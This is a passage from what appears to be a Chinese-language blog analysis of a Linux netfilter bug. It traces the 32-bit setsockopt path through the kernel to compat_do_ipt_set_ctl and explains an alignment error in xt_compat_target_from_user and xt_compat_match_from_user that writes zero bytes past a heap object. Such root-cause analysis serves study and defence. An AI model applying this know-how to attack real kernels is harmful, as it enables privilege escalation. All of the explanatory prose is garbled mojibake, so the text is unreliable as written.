class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>.diag_destroy= tcp_abort,<br>&#125;;<br>EXPORT_SYMBOL(tcp_prot);<br></code></pre></td></tr></table></figure><p>åœ¨å…¬å¼€çš„ exp ä¸­æ¼æ´è§¦å‘è·¯å¾„æŒ‡å®šäº† level ä¸º <code>SOL_IP</code>ï¼Œæ‰€ä»¥è¿™é‡Œåº”è¯¥ä¼šå¯¹åº”è°ƒç”¨åˆ° <code>inet_csk_compat_setsockopt</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_COMPAT</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">compat_tcp_setsockopt</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> sock *sk, <span class="hljs-type">int</span> level, <span class="hljs-type">int</span> optname,</span><br><span class="hljs-params">  <span class="hljs-type">char</span> __user *optval, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> optlen)</span><br>&#123;<br><span class="hljs-keyword">if</span> (level != SOL_TCP)<br><span class="hljs-keyword">return</span> inet_csk_compat_setsockopt(sk, level, optname,<br>  optval, optlen);<br><span class="hljs-keyword">return</span> do_tcp_setsockopt(sk, level, optname, optval, optlen);<br>&#125;<br>EXPORT_SYMBOL(compat_tcp_setsockopt);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><p>åœ¨ <code>inet_csk_compat_setsockopt</code> ä¸­ä¼šè°ƒç”¨åˆ° <code>icsk-&gt;icsk_af_ops-&gt;compat_setsockopt()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">inet_csk_compat_setsockopt</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> sock *sk, <span class="hljs-type">int</span> level, <span class="hljs-type">int</span> optname,</span><br><span class="hljs-params">       <span class="hljs-type">char</span> __user *optval, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> optlen)</span><br>&#123;<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inet_connection_sock</span> *<span class="hljs-title">icsk</span> =</span> inet_csk(sk);<br><br><span class="hljs-keyword">if</span> (icsk-&gt;icsk_af_ops-&gt;compat_setsockopt)<br><span class="hljs-keyword">return</span> icsk-&gt;icsk_af_ops-&gt;compat_setsockopt(sk, level, optname,<br>    optval, optlen);<br><span class="hljs-keyword">return</span> icsk-&gt;icsk_af_ops-&gt;setsockopt(sk, level, optname,<br>     optval, optlen);<br>&#125;<br>EXPORT_SYMBOL_GPL(inet_csk_compat_setsockopt);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œ <code>inet_csk()</code> å±•å¼€å…¶å®å°±æ˜¯ä¸€ä¸ªå¼ºåˆ¶ç±»å‹è½¬æ¢ï¼Œé‚£è¿™é‡Œæˆ‘ä»¬åˆè¦è½¬å›å»çœ‹ <strong>socket ä¸­ sock ç»“æ„ä½“çš„åˆå§‹åŒ–è¿‡ç¨‹</strong>ï¼Œåœ¨ <code>inet_create()</code>  ä¸­ä½¿ç”¨ <code>sock_alloc()</code> åˆ›å»º sock ç»“æ„ä½“ï¼Œæœ€åä¼šè°ƒç”¨åˆ° <code>tcp_v4_init_sock</code>ï¼Œè¿™é‡Œæˆ‘ä»¬çœ‹åˆ°å…¶åˆå§‹åŒ–æ‰€ç”¨çš„å‡½æ•°è¡¨ä¸º <code>ipv4_specific</code>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">tcp_v4_init_sock</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> sock *sk)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inet_connection_sock</span> *<span class="hljs-title">icsk</span> =</span> inet_csk(sk);<br><br>tcp_init_sock(sk);<br><br>icsk-&gt;icsk_af_ops = &amp;ipv4_specific;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_TCP_MD5SIG</span><br>tcp_sk(sk)-&gt;af_specific = &amp;tcp_sock_ipv4_specific;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ‰€ä»¥æœ€ååº”è¯¥è°ƒç”¨åˆ° <code>compat_ip_setsockopt()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inet_connection_sock_af_ops</span> <span class="hljs-title">ipv4_specific</span> =</span> &#123;<br>.queue_xmit   = ip_queue_xmit,<br>.send_check   = tcp_v4_send_check,<br>.rebuild_header   = inet_sk_rebuild_header,<br>.sk_rx_dst_set   = inet_sk_rx_dst_set,<br>.conn_request   = tcp_v4_conn_request,<br>.syn_recv_sock   = tcp_v4_syn_recv_sock,<br>.net_header_len   = <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> iphdr),<br>.setsockopt   = ip_setsockopt,<br>.getsockopt   = ip_getsockopt,<br>.addr2sockaddr   = inet_csk_addr2sockaddr,<br>.sockaddr_len   = <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> sockaddr_in),<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_COMPAT</span><br>.compat_setsockopt = compat_ip_setsockopt,<br>.compat_getsockopt = compat_ip_getsockopt,<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>.mtu_reduced   = tcp_v4_mtu_reduced,<br>&#125;;<br></code></pre></td></tr></table></figure><p>ç”±äºæˆ‘ä»¬å¼€å¯äº† Netfilterï¼Œæ‰€ä»¥åœ¨ <code>compat_ip_setsockopt()</code> æœ€åä¼šè°ƒç”¨åˆ° <code>compat_nf_setsockopt</code> ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_COMPAT</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">compat_ip_setsockopt</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> sock *sk, <span class="hljs-type">int</span> level, <span class="hljs-type">int</span> optname,</span><br><span class="hljs-params"> <span class="hljs-type">char</span> __user *optval, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> optlen)</span><br>&#123;<br>    <span class="hljs-comment">//...</span><br>    <span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_NETFILTER</span><br><span class="hljs-comment">/* we need to exclude all possible ENOPROTOOPTs except default case */</span><br><span class="hljs-keyword">if</span> (err == -ENOPROTOOPT &amp;&amp; optname != IP_HDRINCL &amp;&amp;<br>optname != IP_IPSEC_POLICY &amp;&amp;<br>optname != IP_XFRM_POLICY &amp;&amp;<br>!ip_mroute_opt(optname))<br>err = compat_nf_setsockopt(sk, PF_INET, optname, optval,<br>   optlen);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-keyword">return</span> err;<br>&#125;<br>EXPORT_SYMBOL(compat_ip_setsockopt);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><p>è¿™ä¸ªå‡½æ•°å’Œ <code>compat_nf_getsockopt()</code> ä¸€æ ·éƒ½æ˜¯ <code>compat_nf_sockopt()</code> çš„ wrapperï¼Œåœ¨è¯¥å‡½æ•°ä¸­ä¼šä½¿ç”¨ æ‰¾åˆ°å¯¹åº”çš„å‡½æ•°è¡¨ï¼Œæ ¹æ®å¯¹åº”æ“ä½œè°ƒç”¨å¯¹åº”å‡½æ•°ï¼Œæˆ‘ä»¬æ˜¯ 32 ä½è¿›ç¨‹çš„ç³»ç»Ÿè°ƒç”¨ï¼Œæ‰€ä»¥åº”è¯¥èµ°å…¥ <code>compat_set</code>è¿™ä¸€æŒ‡é’ˆ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_COMPAT</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">compat_nf_sockopt</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> sock *sk, <span class="hljs-type">u_int8_t</span> pf, <span class="hljs-type">int</span> val,</span><br><span class="hljs-params">     <span class="hljs-type">char</span> __user *opt, <span class="hljs-type">int</span> *len, <span class="hljs-type">int</span> get)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nf_sockopt_ops</span> *<span class="hljs-title">ops</span>;</span><br><span class="hljs-type">int</span> ret;<br><br>ops = nf_sockopt_find(sk, pf, val, get);<br><span class="hljs-keyword">if</span> (IS_ERR(ops))<br><span class="hljs-keyword">return</span> PTR_ERR(ops);<br><br><span class="hljs-keyword">if</span> (get) &#123;<br><span class="hljs-keyword">if</span> (ops-&gt;compat_get)<br>ret = ops-&gt;compat_get(sk, val, opt, len);<br><span class="hljs-keyword">else</span><br>ret = ops-&gt;get(sk, val, opt, len);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">if</span> (ops-&gt;compat_set)<br>ret = ops-&gt;compat_set(sk, val, opt, *len);<br><span class="hljs-keyword">else</span><br>ret = ops-&gt;<span class="hljs-built_in">set</span>(sk, val, opt, *len);<br>&#125;<br><br>module_put(ops-&gt;owner);<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><p>é‚£ä¹ˆå…·ä½“è°ƒç”¨åˆ°å“ªä¸ªå‡½æ•°ï¼Ÿåœ¨ <code>nf_sockopt_find</code> ä¸­ä½¿ç”¨å†…æ ¸åŒå‘é“¾è¡¨éå†å®éå†å…¨å±€å˜é‡<code>nf_sockopts</code>ï¼Œåˆ¤æ–­æ¡ä»¶æ˜¯å‡½æ•°è¡¨çš„ pf ç­‰äºæˆ‘ä»¬åœ¨ä¸Šå±‚ä¼ å…¥çš„ pfï¼ˆåœ¨ <code>compat_ip_setsockopt</code> ä¸­ä¼ å…¥çš„ä¸º <code>PF_INET</code>ï¼‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> nf_sockopt_ops *<span class="hljs-title function_">nf_sockopt_find</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> sock *sk, <span class="hljs-type">u_int8_t</span> pf,</span><br><span class="hljs-params"><span class="hljs-type">int</span> val, <span class="hljs-type">int</span> get)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nf_sockopt_ops</span> *<span class="hljs-title">ops</span>;</span><br><br>mutex_lock(&amp;nf_sockopt_mutex);<br>list_for_each_entry(ops, &amp;nf_sockopts, <span class="hljs-built_in">list</span>) &#123;<br><span class="hljs-keyword">if</span> (ops-&gt;pf == pf) &#123;<br><span class="hljs-keyword">if</span> (!try_module_get(ops-&gt;owner))<br><span class="hljs-keyword">goto</span> out_nosup;<br><br><span class="hljs-keyword">if</span> (get) &#123;<br><span class="hljs-keyword">if</span> (val &gt;= ops-&gt;get_optmin &amp;&amp;<br>val &lt; ops-&gt;get_optmax)<br><span class="hljs-keyword">goto</span> out;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">if</span> (val &gt;= ops-&gt;set_optmin &amp;&amp;<br>val &lt; ops-&gt;set_optmax)<br><span class="hljs-keyword">goto</span> out;<br>&#125;<br>module_put(ops-&gt;owner);<br>&#125;<br>&#125;<br>out_nosup:<br>ops = ERR_PTR(-ENOPROTOOPT);<br>out:<br>mutex_unlock(&amp;nf_sockopt_mutex);<br><span class="hljs-keyword">return</span> ops;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>åœ¨ iptables æ¨¡å—çš„åˆå§‹åŒ–å‡½æ•°ä¸­æ³¨å†Œäº†å‡½æ•°è¡¨</strong> <code>ipt_sockopts</code>ï¼Œ<code>nf_register_sockopt()</code> ç”¨ä»¥åœ¨ <code>nf_sockopts</code> é“¾è¡¨ä¸­æ’å…¥èŠ‚ç‚¹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> __init <span class="hljs-title function_">ip_tables_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-comment">//...</span><br><br><span class="hljs-comment">/* Register setsockopt */</span><br>ret = nf_register_sockopt(&amp;ipt_sockopts);<br></code></pre></td></tr></table></figure><p>é‚£ä¹ˆä¸€åˆ‡å°±æ¸…æ¥šäº†ï¼Œå¯¹äº setsockopt ç³»ç»Ÿè°ƒç”¨ï¼Œæˆ‘ä»¬æœ€ç»ˆè°ƒç”¨çš„åº”è¯¥æ˜¯ <code>compat_do_ipt_set_ctl</code> å‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nf_sockopt_ops</span> <span class="hljs-title">ipt_sockopts</span> =</span> &#123;<br>.pf= PF_INET,<br>.set_optmin= IPT_BASE_CTL,<br>.set_optmax= IPT_SO_SET_MAX+<span class="hljs-number">1</span>,<br>.<span class="hljs-built_in">set</span>= do_ipt_set_ctl,<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_COMPAT</span><br>.compat_set= compat_do_ipt_set_ctl,<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>.get_optmin= IPT_BASE_CTL,<br>.get_optmax= IPT_SO_GET_MAX+<span class="hljs-number">1</span>,<br>.get= do_ipt_get_ctl,<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_COMPAT</span><br>.compat_get= compat_do_ipt_get_ctl,<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>.owner= THIS_MODULE,<br>&#125;;<br></code></pre></td></tr></table></figure><h1>0x01.æ¼æ´åˆ†æ</h1><p>å‰é¢è®²åˆ° 32 ä½ç¨‹åºçš„ setsockopt ç³»ç»Ÿè°ƒç”¨æœ€ç»ˆä¼šè°ƒç”¨åˆ° <code>compat_do_ipt_set_ctl()</code>ï¼Œè€Œæ¼æ´ä¾¿å‘ç”Ÿåœ¨å½“æˆ‘ä»¬æŒ‡å®š optname ä¸º <code>IPT_SO_SET_REPLACE</code> æ—¶ï¼Œå…¶æœ€ç»ˆä¼šè°ƒç”¨ <code>compat_do_replace()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span><br><span class="hljs-title function_">compat_do_ipt_set_ctl</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> sock *sk,<span class="hljs-type">int</span> cmd, <span class="hljs-type">void</span> __user *user,</span><br><span class="hljs-params">      <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> len)</span><br>&#123;<br><span class="hljs-type">int</span> ret;<br><br><span class="hljs-keyword">if</span> (!ns_capable(sock_net(sk)-&gt;user_ns, CAP_NET_ADMIN))<br><span class="hljs-keyword">return</span> -EPERM;<br><br><span class="hljs-keyword">switch</span> (cmd) &#123;<br><span class="hljs-keyword">case</span> IPT_SO_SET_REPLACE:<br>ret = compat_do_replace(sock_net(sk), user, len);<br><span class="hljs-keyword">break</span>;<br><br><span class="hljs-keyword">case</span> IPT_SO_SET_ADD_COUNTERS:<br>ret = do_add_counters(sock_net(sk), user, len, <span class="hljs-number">1</span>);<br><span class="hljs-keyword">break</span>;<br><br><span class="hljs-keyword">default</span>:<br>ret = -EINVAL;<br>&#125;<br><br><span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><p>å­˜åœ¨å¦‚ä¸‹è°ƒç”¨é“¾ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">compat_do_ipt_set_ctl()<br>    compat_do_replace()<br>    translate_compat_table()<br>    compat_copy_entry_from_user()<br>    xt_compat_match_from_user()<br>    xt_compat_target_from_user()<br></code></pre></td></tr></table></figure><p>è¿™é‡Œæå‰è¯´æ˜ï¼š<strong>æ¼æ´åœ¨</strong> <code>xt_compat_match_from_user()</code> <strong>ä¸</strong> <code>xt_compat_target_from_user()</code> <strong>ä¸­éƒ½å­˜åœ¨ï¼Œé€»è¾‘ç›¸åŒ</strong></p><p>æˆ‘ä»¬å…ˆæ¥çœ‹ <code>xt_compat_target_from_user()</code>ï¼Œåœ¨è¿™é‡Œä¼šå°† <code>t-&gt;data + target-&gt;targetsize</code> èµ·å§‹çš„é•¿åº¦ä¸º <code>pad</code> çš„åŒºåŸŸç½® 0ï¼šå…ˆå°† targetsize å‘ä¸Šä¸ 8 å¯¹é½ï¼Œä¹‹åå†å‡å» targetsizeï¼Œå‰©ä¸‹çš„è¿™æ®µè‡ªç„¶å°±æ˜¯åˆ†é…çš„ object å‡å» targetsize åçš„å‰©ä½™ç©ºé—´</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">xt_compat_target_from_user</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> xt_entry_target *t, <span class="hljs-type">void</span> **dstptr,</span><br><span class="hljs-params"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *size)</span><br>&#123;<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">xt_target</span> *<span class="hljs-title">target</span> =</span> t-&gt;u.kernel.target;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">compat_xt_entry_target</span> *<span class="hljs-title">ct</span> =</span> (<span class="hljs-keyword">struct</span> compat_xt_entry_target *)t;<br><span class="hljs-type">int</span> pad, off = xt_compat_target_offset(target);<br><span class="hljs-type">u_int16_t</span> tsize = ct-&gt;u.user.target_size;<br><span class="hljs-type">char</span> name[<span class="hljs-keyword">sizeof</span>(t-&gt;u.user.name)];<br><br>t = *dstptr;<br><span class="hljs-built_in">memcpy</span>(t, ct, <span class="hljs-keyword">sizeof</span>(*ct));<br><span class="hljs-keyword">if</span> (target-&gt;compat_from_user)<br>target-&gt;compat_from_user(t-&gt;data, ct-&gt;data);<br><span class="hljs-keyword">else</span><br><span class="hljs-built_in">memcpy</span>(t-&gt;data, ct-&gt;data, tsize - <span class="hljs-keyword">sizeof</span>(*ct));<br>pad = XT_ALIGN(target-&gt;targetsize) - target-&gt;targetsize;<br><span class="hljs-keyword">if</span> (pad &gt; <span class="hljs-number">0</span>)<br><span class="hljs-built_in">memset</span>(t-&gt;data + target-&gt;targetsize, <span class="hljs-number">0</span>, pad);<span class="hljs-comment">// æ¼æ´äº§ç”Ÿç‚¹</span><br><br>tsize += off;<br>t-&gt;u.user.target_size = tsize;<br>strlcpy(name, target-&gt;name, <span class="hljs-keyword">sizeof</span>(name));<br>module_put(target-&gt;me);<br><span class="hljs-built_in">strncpy</span>(t-&gt;u.user.name, name, <span class="hljs-keyword">sizeof</span>(t-&gt;u.user.name));<br><br>*size += off;<br>*dstptr += tsize;<br>&#125;<br>EXPORT_SYMBOL_GPL(xt_compat_target_from_user);<br></code></pre></td></tr></table></figure><p>ç†æƒ³æƒ…å†µä¸‹ï¼Œåº”è¯¥æ˜¯æŒ‰ç…§å¦‚ä¸‹æ–¹å¼è¿›è¡Œæ¸…é›¶çš„ï¼Œçœ‹èµ·æ¥å¥½åƒæ²¡æœ‰ä»€ä¹ˆé—®é¢˜ï¼Ÿï¼ˆä¸‹å›¾ä¾‹å­ä¸­å‡è®¾ targetsize å°äº 8ï¼‰</p><p><img src="https://s2.loli.net/2022/03/31/3jlPfpg2AMYoZrv.png" alt="image.png"></p><p><strong>ä½†æ˜¯ t-&gt;data å¹¶ä¸ä¸€å®šæ˜¯ 8 å­—èŠ‚å¯¹é½çš„ï¼Œè€Œæˆ‘ä»¬è®¡ç®— pad æ—¶å´é»˜è®¤ t-&gt;data åº”å½“ 8 å­—èŠ‚å¯¹é½</strong>ï¼Œå› æ­¤è‹¥ t-&gt;data å¹¶é 8 å­—èŠ‚å¯¹é½ï¼Œè€Œ pad è®¡ç®—æ—¶å‘ä¸Šä¸ 8  å­—èŠ‚å¯¹é½ï¼Œ<strong>å°±ä¼šå¯¼è‡´è¶Šç•Œå†™å…¥æ•°å­—èŠ‚çš„ 0 åˆ°ç›¸é‚»çš„ä¸‹ä¸€ä¸ª object ä¸­</strong></p><p><img src="https://s2.loli.net/2022/03/31/eS15WvRZuz8f6HU.png" alt="image.png"></p><p>è¿™é‡Œç¬”è€…å¯¹å…¬å¼€çš„ exp è¿›è¡Œè°ƒè¯•ï¼Œå¯ä»¥çœ‹åˆ°çš„æ˜¯ t-&gt;data <strong>ç¡®ä¹å¯ä»¥ä¸ºä¸€ä¸ªé 8 å­—èŠ‚å¯¹é½çš„åœ°å€ï¼Œè€Œæ­¤æ—¶ target-&gt;targetsize å†å‘ä¸Šå¯¹ 8 å­—èŠ‚å¯¹é½ï¼Œè‡ªç„¶å°±ä¼šè¶Šç•Œå†™åˆ°ç›¸é‚»ä¸‹ä¸€ object çš„å¼€å¤´</strong></p><p><img src="https://s2.loli.net/2022/03/31/NBqKxZEDsOmgc64.png" alt="image.png"></p><p>åœ¨ <code>xt_compat_match_from_user()</code> ä¸­äº§ç”Ÿçš„æ¼æ´é€»è¾‘ç›¸åŒï¼Œè¿™é‡Œå°±ä¸èµ˜å™äº†</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">xt_compat_match_from_user</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> xt_entry_match *m, <span class="hljs-type">void</span> **dstptr,</span><br><span class="hljs-params">       <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *size)</span><br>&#123;<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">xt_match</span> *<span class="hljs-title">match</span> =</span> m-&gt;u.kernel.match;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">compat_xt_entry_match</span> *<span class="hljs-title">cm</span> =</span> (<span class="hljs-keyword">struct</span> compat_xt_entry_match *)m;<br><span class="hljs-type">int</span> pad, off = xt_compat_match_offset(match);<br><span class="hljs-type">u_int16_t</span> msize = cm-&gt;u.user.match_size;<br><span class="hljs-type">char</span> name[<span class="hljs-keyword">sizeof</span>(m-&gt;u.user.name)];<br><br>m = *dstptr;<br><span class="hljs-built_in">memcpy</span>(m, cm, <span class="hljs-keyword">sizeof</span>(*cm));<br><span class="hljs-keyword">if</span> (match-&gt;compat_from_user)<br>match-&gt;compat_from_user(m-&gt;data, cm-&gt;data);<br><span class="hljs-keyword">else</span><br><span class="hljs-built_in">memcpy</span>(m-&gt;data, cm-&gt;data, msize - <span class="hljs-keyword">sizeof</span>(*cm));<br>pad = XT_ALIGN(match-&gt;matchsize) - match-&gt;matchsize;<br><span class="hljs-keyword">if</span> (pad &gt; <span class="hljs-number">0</span>)<br><span class="hljs-built_in">memset</span>(m-&gt;data + match-&gt;matchsize, <span class="hljs-number">0</span>, pad); <span class="hljs-comment">// æ¼æ´äº§ç”Ÿç‚¹</span><br><br>msize += off;<br>m-&gt;u.user.match_size = msize;<br>strlcpy(name, match-&gt;name, <span class="hljs-keyword">sizeof</span>(name));<br>module_put(match-&gt;me);<br><span class="hljs-built_in">strncpy</span>(m-&gt;u.user.name, name, <span class="hljs-keyword">sizeof</span>(m-&gt;u.user.name));<br><br>*size += off;<br>*dstptr += 